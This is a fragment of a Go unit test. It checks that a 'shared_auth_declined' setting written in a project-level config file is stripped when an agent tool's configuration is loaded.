	writeProjectCfg(t, proj, "agent = \"claude\"\nshared_auth_declined = [\"claude\"]\n")
	cfg, err := Load(proj)
	if err != nil {
		t.Fatal(err)
	}
	if len(cfg.SharedAuthDeclined) != 0 {
		t.Fatalf("project-layer shared_auth_declined must be stripped from the resolved config, got %v", cfg.SharedAuthDeclined)
	}
}
